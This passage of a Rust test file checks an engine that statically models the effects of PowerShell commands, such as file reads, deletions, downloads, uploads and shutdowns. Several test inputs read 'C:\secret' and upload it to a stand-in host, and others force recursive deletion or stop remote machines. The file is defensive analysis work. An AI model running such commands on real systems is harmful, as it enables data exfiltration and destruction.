    let is = |id: &effinterp_proto::OccurrenceId, wanted: &str| {
        graph.nodes.iter().any(|node| {
            &node.id == id
                && matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, .. } if operation.0 == wanted)
        })
    };
    let mut reached: Vec<_> = graph
        .nodes
        .iter()
        .filter(|node| is(&node.id, "filesystem.read"))
        .map(|node| &node.id)
        .collect();
    let mut index = 0;
    while let Some(&from) = reached.get(index) {
        index += 1;
        for edge in graph.edges.iter().filter(|edge| &edge.from == from) {
            if is(&edge.to, "network.upload") {
                return true;
            }
            if !reached.contains(&&edge.to) {
                reached.push(&edge.to);
            }
        }
    }
    false
}

#[test]
fn web_requests_download_to_and_upload_from_files() {
    for (source, model) in [
        (
            r"Invoke-WebRequest -Uri https://example.test/x -OutFile C:\f",
            "powershell/invoke-webrequest@v1",
        ),
        (
            r"(New-Object System.Net.WebClient).DownloadFile('https://example.test/x', 'C:\f')",
            "powershell/webclient-downloadfile@v1",
        ),
    ] {
        let plan = source_plan(source, &[]);
        assert_eq!(paths(&plan, "filesystem.write"), ["C:/f"], "{source}");
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "network.download"
                && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::NetworkEndpoint { host, .. } } if host == "example.test")
        }), "{source}");
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        assert!(has_model(&plan, model), "{source}");
    }
    for source in [
        r"(New-Object Other.WebClient).DownloadFile('https://example.test/x', 'C:\f')",
        r"Invoke-WebRequest https://example.test/x",
    ] {
        let plan = source_plan(source, &[]);
        assert!(paths(&plan, "filesystem.write").is_empty(), "{source}");
        assert_eq!(plan.boundaries.len(), 1, "{source}");
    }
    let causal = |source: &str| {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Source {
                language: "powershell".into(),
                dialect: None,
                source: source.into(),
                cwd: Some("C:\\work".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        plan
    };
    let uploads = |plan: &Plan| {
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "network.upload")
            .count()
    };
    // -InFile sends the file it reads; -Body sends the content a Get-Content
    // assignment read, which goes to the variable rather than the output.
    // -OutVariable replaces the variable only after the request is sent.
    for source in [
        r"Invoke-WebRequest -Uri https://upload.example/x -Method Post -InFile C:\secret",
        "$c = Get-Content -Raw C:\\secret\nirm https://upload.example/x -Method Put -Body $c",
        "$c = Get-Content C:\\secret; iwr https://upload.example/x -Method Post -Body $c -OutVariable c",
        "$c = Get-Content C:\\secret -OutVariable c; iwr https://upload.example/x -Method Post -Body $c",
    ] {
        let plan = causal(source);
        assert_eq!(paths(&plan, "filesystem.read"), ["C:/secret"], "{source}");
        assert_eq!(uploads(&plan), 1, "{source}");
        assert!(read_reaches_upload(&plan), "{source}");
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        assert!(
            plan.effects
                .iter()
                .all(|effect| !effect.attributes.contains_key("disclosure")),
            "{source}"
        );
    }
    let literal = causal(r"Invoke-WebRequest https://upload.example/x -Method Post -Body 'hello'");
    assert_eq!(uploads(&literal), 1);
    assert!(paths(&literal, "filesystem.read").is_empty());
    assert!(literal.boundaries.is_empty(), "{:?}", literal.boundaries);
    // Commands that write no PowerShell variable keep the binding: a
    // WebClient download, and a native program whose `-o c` names a file.
    for between in [
        r"(New-Object System.Net.WebClient).DownloadFile('https://example.test/x', 'C:\f')",
        r"curl.exe -o c https://example.test/x",
    ] {
        let source = format!(
            "$c = Get-Content C:\\secret; {between}; iwr https://upload.example/x -Method Post -Body $c"
        );
        let plan = causal(&source);
        assert_eq!(uploads(&plan), 1, "{source}");
        assert!(read_reaches_upload(&plan), "{source}");
    }
    // A reassigned or -OutVariable-overwritten variable no longer holds the
    // file (the request is still sent, with a boundary for its body), a
    // piped assignment holds the pipeline's last output, a quoted '$c' body
    // is literal text whatever other argument names $c, a body needs an
    // upload method, and content reaching any other command is not modeled.
    for (source, sent) in [
        (
            "$c = Get-Content C:\\secret; $c = 'x'; iwr https://upload.example/x -Method Post -Body $c",
            1,
        ),
        (
            "$c = Get-Content C:\\secret; Write-Output public -OutVariable c; iwr https://upload.example/x -Method Post -Body $c",
            1,
        ),
        (
            "$c = Get-Content C:\\secret; Write-Output public -OutVariable:'c'; iwr https://upload.example/x -Method Post -Body $c",
            1,
        ),
        (
            "$c = Get-Content -Raw C:\\secret | Set-Content C:\\safe; iwr https://upload.example/x -Method Post -Body $c",
            1,
        ),
        (
            "$c = Get-Content C:\\secret; iwr https://upload.example/x -Method Post -Body '$c' -OutVariable $c",
            1,
        ),
        (
            r"Invoke-WebRequest https://upload.example/x -InFile C:\secret",
            0,
        ),
        ("$c = Get-Content C:\\secret; Remove-Item $c", 0),
    ] {
        let plan = causal(source);
        assert!(!read_reaches_upload(&plan), "{source}");
        assert_eq!(uploads(&plan), sent, "{source}");
        assert!(paths(&plan, "filesystem.delete").is_empty(), "{source}");
        assert!(!plan.boundaries.is_empty(), "{source}");
    }
    // The piped assignment still reads the file and writes the copy.
    let piped = causal(
        "$c = Get-Content -Raw C:\\secret | Set-Content C:\\safe; iwr https://upload.example/x -Method Post -Body $c",
    );
    assert_eq!(paths(&piped, "filesystem.read"), ["C:/secret"]);
    assert_eq!(paths(&piped, "filesystem.write"), ["C:/safe"]);
}

#[test]
fn start_process_launches_its_argument_list() {
    let started = plan(&[
        "pwsh",
        "-Command",
        r"Start-Process -FilePath cmd -ArgumentList '/c rd /s /q C:\old'",
    ]);
    assert_eq!(paths(&started, "filesystem.delete"), ["C:/old"]);
    let what_if = plan(&[
        "pwsh",
        "-Command",
        r"Start-Process cmd '/c rd /s /q C:\old' -WhatIf",
    ]);
    assert!(paths(&what_if, "filesystem.delete").is_empty());
    // The program splits its command line itself; quoted words are not
    // modeled.
    let quoted = source_plan(r#"Start-Process git -ArgumentList '"a b"'"#, &[]);
    assert_eq!(quoted.boundaries.len(), 1);
}

#[test]
fn power_cmdlets_bind_what_if_values_and_a_remote_computer() {
    let powers = |source: &str| {
        plan(&["pwsh", "-Command", source])
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "system.power")
            .count()
    };
    assert_eq!(powers("Stop-Computer -WhatIf:$false"), 1);
    assert_eq!(powers("Stop-Computer -ComputerName srv1"), 1);
    assert_eq!(powers("Restart-Computer -Force -WhatIf:$true"), 0);
    // Prompting and common parameters do not change the transition.
    assert_eq!(powers("Stop-Computer -Confirm:$false -ErrorAction Stop"), 1);
    assert_eq!(powers("Stop-Computer -Confirm:$false -WhatIf"), 0);
    // PowerShell rejects -Delay outside 1..32767 and waiting parameters
    // without -Wait, and -Wait never restarts the local computer.
    assert_eq!(powers("Restart-Computer -Force -Delay 0"), 0);
    assert_eq!(powers("Restart-Computer -Force -Delay 5"), 0);
    assert_eq!(powers("Restart-Computer -Wait -Delay 5"), 0);
    assert_eq!(
        powers("Restart-Computer -ComputerName srv1 -Wait -For PowerShell -Delay 5"),
        1
    );
    assert_eq!(
        powers("Restart-Computer -ComputerName srv1 -Wait -Delay 0"),
        0
    );
    assert_eq!(powers("Stop-Computer -Wait"), 0);
    // Values bind as PowerShell literals: a signed number and a quoted
    // number are the numbers they spell.
    assert_eq!(
        powers("Restart-Computer -ComputerName srv1 -Wait -Timeout -1"),
        1
    );
    assert_eq!(
        powers("Restart-Computer -ComputerName srv1 -Wait -Delay \"1\""),
        1
    );
    assert_eq!(
        powers("Restart-Computer -ComputerName srv1 -Wait -Delay '0'"),
        0
    );
    // Binding rejects a value outside a parameter's closed set or type.
    assert_eq!(powers("Stop-Computer -WsmanAuthentication Kerberos"), 1);
    assert_eq!(powers("Stop-Computer -WsmanAuthentication garbage"), 0);
    assert_eq!(powers("Stop-Computer -ErrorAction garbage"), 0);
    assert_eq!(powers("Stop-Computer -OutBuffer garbage"), 0);
    // A quoted local name, alone or in a list, is still the local computer.
    assert_eq!(
        powers("Restart-Computer -ComputerName \"localhost\" -Wait"),
        0
    );
    assert_eq!(
        powers("Restart-Computer -ComputerName 'localhost','.' -Wait"),
        0
    );
    assert_eq!(
        powers("Restart-Computer -ComputerName \"srv1\",'localhost' -Wait"),
        1
    );
}

#[test]
fn redefined_commands_lose_their_built_in_meaning() {
    for source in [
        r"function Remove-Item {}; Remove-Item -Recurse C:\old",
        r"Set-Alias rm Write-Output; rm -Recurse C:\old",
        r"Remove-Item alias:rm; rm -Recurse C:\old",
    ] {
        let plan = source_plan(source, &[]);
        assert!(paths(&plan, "filesystem.delete").is_empty(), "{source}");
    }
    // A redefinition covers only the name it defines, and -WhatIf defines
    // nothing.
    for source in [
        r"Set-Alias rm Write-Output; Remove-Item C:\old",
        r"Remove-Item alias:rm -WhatIf; rm C:\old",
    ] {
        let plan = source_plan(source, &[]);
        assert_eq!(paths(&plan, "filesystem.delete"), ["C:/old"], "{source}");
    }
}

#[test]
fn path_and_literal_path_do_not_bind_together() {
    for source in [
        r"Remove-Item -Recurse -Path C:\a -LiteralPath C:\b",
        r"Remove-Item -Path C:\a -Path C:\b",
    ] {
        let plan = source_plan(source, &[]);
        assert!(paths(&plan, "filesystem.delete").is_empty(), "{source}");
        assert_eq!(plan.boundaries.len(), 1, "{source}");
    }
}

#[test]
fn executable_names_resolve_without_case_or_exe_on_windows_and_drvfs() {
    let deletes = |source: &str, cwd: &str, os_dialect| {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some(cwd.into()),
                context: effinterp_proto::HostContext {
                    os_dialect,
                    ..Default::default()
                },
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    };
    let removal = r"-Command 'Remove-Item -Recurse -LiteralPath C:\old'";
    for (head, cwd, os_dialect, resolved) in [
        ("pwsh.EXE", r"C:\work", OsDialect::Unknown, true),
        ("PWSH.exe", "/mnt/c/work", OsDialect::Unknown, true),
        ("pwsh.exe", "/mnt/d", OsDialect::Linux, true),
        // A host that may be Linux may be WSL, whose interop runs the
        // Windows program from any cwd.
        ("pwsh.EXE", "/work", OsDialect::Unknown, true),
        ("pwsh.exe", "/mnt/cdrom", OsDialect::Linux, true),
        // macOS looks the name up literally, and a path names a file.
        ("pwsh.EXE", "/work", OsDialect::Macos, false),
        ("pwsh.exe", "/mnt/cdrom", OsDialect::Macos, false),
        ("./pwsh.EXE", r"C:\work", OsDialect::Unknown, false),
    ] {
        assert_eq!(
            deletes(&format!("{head} {removal}"), cwd, os_dialect),
            resolved,
            "{head} in {cwd} on {os_dialect:?}"
        );
    }
    // Outside WSL a Linux `pwsh.exe` is an unrelated file, which stays a
    // boundary rather than certifying the Windows program.
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: "pwsh.exe -Command 'Get-Date'".into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason == BoundaryReason::UNMODELED_COMMAND)
    );
}
